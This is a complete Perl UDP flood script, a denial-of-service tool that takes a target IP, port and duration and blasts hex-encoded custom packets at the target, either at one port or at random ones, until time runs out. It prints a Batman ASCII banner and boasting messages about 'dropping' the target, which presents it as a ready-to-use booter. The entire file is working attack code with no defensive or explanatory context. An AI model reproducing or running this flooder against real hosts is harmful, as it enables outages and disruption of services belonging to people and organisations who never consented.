#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;
	
use Socket;
use strict;

my ($ip,$port,$time) = @ARGV;

my ($iaddr,$endtime,$pport);
my @packets = (
    "090412ae79504ede40faa7594da632a5b56300ff00fffeFEFEFEFDFDFDFD78563417edca0101a804e8030000c804e8030000de",
    "0a00ff00fffeFEFEFEFDFDFDFD7856341724b6fa943e57c4f4b8a5330b603b1b34ed8001016e324b44485048445652434a59495a49435654514645574c504647524b4d495455474a4c52534c41494e484f534f4451544647531a00a804400d0300c80480841e00de",
    "0833298bde0abc621b3b4a7f7251cf4b4b0638aa4ca9d15b2f7e5ccb48073a67bbc76e4b1ab69d6c25a047deaa4d08e49152",
    "3a7e2377f1a7484dc0d4f9c05ab39d694187894ba4db5858a8",
    "48dcaf9c51afdb41441d173cd369f8aadacd7a8bf9c1f97816af8934e0",
);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print BOLD RED<<EOTEXT;

MMMMMMMMMMMMMMMMMMMMM                              MMMMMMMMMMMMMMMMMMMMM
 `MMMMMMMMMMMMMMMMMMMM           N    N           MMMMMMMMMMMMMMMMMMMM'
   `MMMMMMMMMMMMMMMMMMM          MMMMMM          MMMMMMMMMMMMMMMMMMM'  
     MMMMMMMMMMMMMMMMMMM-_______MMMMMMMM_______-MMMMMMMMMMMMMMMMMMM    
      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM    
      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM    
      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM    
     .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.    
    MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
                   `MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM'                
                          `MMMMMMMMMMMMMMMMMM'                    
                              `MMMMMMMMMM'                              
                                 MMMMMM                         
                                  MMMM                                  
                                   MM                                  


EOTEXT

print "MemeCFW and The Bat Dropped Yo Shit $ip " . ($port ? $port : "Random") . " Port With Custom Packets" . 
  ($time ? " for $time seconds" : "") . "\n";
print "Stop NULLING With Ctrl-C\n" unless $time;

my @binary_packets = map { pack("H*", $_) } @packets;

for (;time() <= $endtime;) {
  $pport = $port ? $port : int(rand(65500))+1;
  
  foreach my $packet (@binary_packets) {
    send(flood, $packet, 0, pack_sockaddr_in($pport, $iaddr));
  }
}